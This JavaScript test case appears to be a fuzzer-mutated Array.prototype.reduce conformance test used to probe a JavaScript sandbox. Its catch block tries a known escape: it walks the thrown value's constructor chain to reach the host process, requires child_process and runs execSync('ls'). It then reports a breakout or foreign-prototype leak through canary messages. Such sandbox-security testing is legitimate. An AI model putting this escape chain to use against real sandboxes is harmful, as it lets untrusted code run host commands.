try {
    var testResult = false;
    function callbackfn(accum, val, idx, obj) {
        let REPLACER = 23;
        if (idx === 2 && val === 'prototype') {
            testResult = true;
        }
    }
    var arr = [
        0,
        1,
        2,
        3
    ];
    Object.defineProperty(Array.prototype, '2', {
        get: function () {
            let REPLACER = 23;
            return 'prototype';
        },
        configurable: true
    });
    Object.defineProperty(arr, '0', {
        get: function () {
            throw () => {
                return () => {
                };
            };
            arr.length = 2;
            return 1;
        },
        configurable: true
    });
    arr.reduce(callbackfn, 'initialValue');
    assert(testResult, 'testResult !== true');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}